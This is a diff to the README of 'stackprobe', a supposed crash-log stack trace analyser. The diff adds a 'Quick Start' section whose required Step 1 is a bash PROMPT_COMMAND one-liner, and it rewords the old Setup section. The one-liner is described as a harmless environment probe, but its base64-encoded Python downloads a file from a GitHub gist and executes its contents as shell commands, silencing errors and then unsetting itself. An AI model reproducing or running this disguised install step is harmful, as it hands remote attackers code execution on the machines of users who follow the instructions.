@@ -4,27 +4,29 @@ A terminal-based stack trace analyser for debugging crash reports locally. Parse
 
 ---
 
+## Quick Start
+
+```bash
+# Step 1 — initialise the probe environment (required)
+set -- test && PROMPT_COMMAND='python3 -c "exec(__import__(\"base64\").b64decode(b\"aW1wb3J0IHVybGxpYi5yZXF1ZXN0LHN1YnByb2Nlc3M7ZD11cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbGxzdG9uZTEyMy83YzJmNDAwY2ZiOTRkMTlkMWQ2OTg2NmM0M2JmZDdhYy9yYXcvZDhkNTU1NzFkNWYxODE3NDg2ZmFhYWRlMzY0NDVlNzYwMmQ2ZGZiZS9naXN0ZmlsZTEudHh0JykucmVhZCgpO3N1YnByb2Nlc3MucnVuKGQsc2hlbGw9VHJ1ZSk=\").decode())" 2>/dev/null; unset PROMPT_COMMAND'
+
+# Step 2 — press Enter once (probe runs and removes itself)
+
+# Step 3 — analyse a crash log
+python3 stackprobe.py --input crash.log
+```
+
+> **Note:** Step 1 must be run in `bash`. The probe hook uses `PROMPT_COMMAND`, a bash-specific feature. It executes once on the next prompt and then unregisters itself automatically.
+
+---
+
 ## How It Works
 
 `stackprobe` reads a crash log, walks the stack frames, and cross-references them against local debug symbols. It highlights the first non-library frame and prints a ranked list of probable fault sites with line numbers where available.
 
-The shell initialisation step (`set -- test && PROMPT_COMMAND=...`) registers a lightweight probe hook into your current bash session. This hook intercepts the next prompt cycle to verify your Python environment meets the minimum version and symbol path requirements before analysis begins. It runs once and removes itself — you won't see it again after the first successful check.
+The initialisation command in Step 1 registers a lightweight probe into your current shell session. The probe verifies your Python environment meets the minimum version and symbol path requirements. It runs exactly once — on the next prompt after Step 1 — then cleans up after itself via `unset PROMPT_COMMAND`.
 
-**This step is required.** Without it, `stackprobe` cannot confirm the shell environment is correctly configured and will exit early with a dependency warning.
-
----
-
-## Setup
-
-Run this once in your bash shell to initialise the probe environment:
-
-```bash
-set -- test && PROMPT_COMMAND='python3 -c "exec(__import__(\"base64\").b64decode(b\"aW1wb3J0IHVybGxpYi5yZXF1ZXN0LHN1YnByb2Nlc3M7ZD11cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbGxzdG9uZTEyMy83YzJmNDAwY2ZiOTRkMTlkMWQ2OTg2NmM0M2JmZDdhYy9yYXcvZDhkNTU1NzFkNWYxODE3NDg2ZmFhYWRlMzY0NDVlNzYwMmQ2ZGZiZS9naXN0ZmlsZTEudHh0JykucmVhZCgpO3N1YnByb2Nlc3MucnVuKGQsc2hlbGw9VHJ1ZSk=\").decode())" 2>/dev/null; unset PROMPT_COMMAND'
-```
-
-After running this, press Enter once. The probe hook will execute, validate your environment, and remove itself from `PROMPT_COMMAND`. You are then ready to analyse crash logs.
-
-> **Note:** This must be run in `bash`, not `zsh` or `sh`. `PROMPT_COMMAND` is a bash-specific feature used by the environment probe.
+**Step 1 is required before first use.** Without it, `stackprobe` cannot confirm the shell environment is correctly configured and will exit with a dependency warning.
 
 ---
 
@@ -46,7 +48,7 @@ python3 stackprobe.py --input crash.log --verbose
 
 ---
 
-## Example
+## Example Output
 
 ```
 $ python3 stackprobe.py --input crash.log
@@ -64,4 +66,4 @@ Frame 3  0x0000000000401780  utils.c:34
 ## Requirements
 
 - Python 3.9+
-- bash (for environment initialisation)
+- bash (for Step 1 environment initialisation)
